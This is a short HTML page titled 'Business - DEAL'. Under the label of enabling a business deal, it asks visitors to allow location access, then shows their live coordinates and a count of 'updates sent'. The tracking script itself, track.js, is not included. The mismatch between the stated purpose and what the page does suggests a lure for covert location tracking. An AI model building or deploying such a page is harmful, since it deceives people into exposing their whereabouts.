<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Business - DEAL</title>
  <style>
    :root{--bg:#0d0d14;--card:#161622;--border:#252535;--g:#a8ff3e;--r:#ff4d4d;--tx:#e8e8f0;--dim:#55556a}
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
    .card{background:var(--card);border:1px solid var(--border);border-radius:16px;max-width:400px;width:100%;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)}
    .card-top{background:linear-gradient(135deg,#0e1f02,#011a1a);padding:30px 24px 22px;text-align:center;border-bottom:1px solid var(--border)}
    .card-icon{font-size:52px;margin-bottom:12px}
    .card-top h1{font-size:20px;font-weight:800;margin-bottom:8px}
    .card-top p{font-size:13px;color:var(--dim);line-height:1.7}
    .card-top p b{color:var(--tx)}
    .card-body{padding:22px 24px}
    .pulse-ring{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:rgba(168,255,62,.1);border:1px solid rgba(168,255,62,.3);border-radius:20px;font-size:12px;font-weight:700;color:#a8ff3e;margin-bottom:20px}
    .dot{width:8px;height:8px;border-radius:50%;background:#a8ff3e;animation:pulse 1.5s ease-in-out infinite}
    @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(168,255,62,.5)}50%{box-shadow:0 0 0 5px rgba(168,255,62,0)}}
    .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;text-align:left;margin-bottom:20px}
    .stat{background:#0d0d14;border:1px solid var(--border);border-radius:8px;padding:10px 12px}
    .stat-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
    .stat-value{font-size:13px;font-weight:700;color:#a8ff3e}
    #err{background:rgba(255,77,77,.1);border:1px solid rgba(255,77,77,.3);border-radius:8px;padding:10px 12px;font-size:12px;color:var(--r);margin-bottom:14px;display:none}
    .loading{text-align:center;padding:40px 24px}
    .loading .big{font-size:56px;margin-bottom:16px}
    .loading h2{font-size:20px;font-weight:800;margin-bottom:8px}
    .loading p{font-size:13px;color:var(--dim);margin-bottom:20px;line-height:1.7}
  </style>
</head>
<body>

<div class="card">

  <!-- LOADING/ERROR VIEW -->
  <div id="view-loading">
    <div class="loading">
      <div class="big" id="loading-icon">📍</div>
      <h2 id="loading-title">Enabling Business Deal...</h2>
      <p id="loading-msg">Please allow location access when prompted.</p>
      <div id="err"></div>
    </div>
  </div>

  <!-- SHARING VIEW -->
  <div id="view-sharing" style="display:none">
    <div class="big">📡</div>
    <h2>Business Deal</h2>
    <p>Business Deal is active. Close this tab to stop.</p>
    <div class="pulse-ring"><div class="dot"></div> LIVE · <span id="elapsed">0s</span></div>
    <div class="stats">
      <div class="stat"><div class="stat-label">Latitude</div><div class="stat-value" id="s-lat">—</div></div>
      <div class="stat"><div class="stat-label">Longitude</div><div class="stat-value" id="s-lng">—</div></div>
      <div class="stat"><div class="stat-label">Accuracy</div><div class="stat-value" id="s-acc">—</div></div>
      <div class="stat"><div class="stat-label">Updates Sent</div><div class="stat-value" id="s-cnt">0</div></div>
    </div>
    <p style="font-size:11px;color:var(--dim)">You may safely close this tab.</p>
  </div>

  <!-- DONE VIEW -->
  <div id="view-done" style="display:none">
    <div class="big" id="done-icon">✅</div>
    <h2 id="done-title">Done</h2>
    <p id="done-msg">You may close this page.</p>
  </div>

</div>

<script type="module" src="track.js"></script>
</body>
</html>
